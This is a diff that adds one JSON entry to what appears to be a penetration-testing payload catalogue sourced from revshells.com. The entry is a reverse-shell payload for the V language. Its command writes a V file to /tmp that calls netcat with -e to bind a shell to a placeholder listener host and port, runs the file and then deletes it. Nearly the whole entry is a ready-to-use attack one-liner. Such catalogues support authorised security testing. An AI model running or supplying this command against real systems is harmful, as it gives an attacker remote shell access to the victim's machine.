@@ -1,0 +1,29 @@
+{
+  "id": "rsg-reverseshell-vlang",
+  "name": "RSG · ReverseShell · Vlang",
+  "command": "echo 'import os' > /tmp/t.v && echo 'fn main() { os.system(\"nc -e <shell> <lhost> <lport> 0>&1\") }' >> /tmp/t.v && v run /tmp/t.v && rm /tmp/t.v",
+  "description": "Reverse Shell payload — Vlang (via reverse-shell-generator).",
+  "platform": "linux",
+  "tags": [
+    "rsg",
+    "payload",
+    "reverse-shell",
+    "linux",
+    "mac"
+  ],
+  "source": "rsg",
+  "source_url": "https://www.revshells.com/",
+  "upstream_id": "ReverseShell/Vlang/69",
+  "category": "payloads",
+  "subcategory": "reverse-shell",
+  "references": [
+    {
+      "title": "reverse-shell-generator (revshells.com)",
+      "url": "https://www.revshells.com/"
+    },
+    {
+      "title": "reverse-shell-generator GitHub",
+      "url": "https://github.com/0dayCTF/reverse-shell-generator"
+    }
+  ]
+}
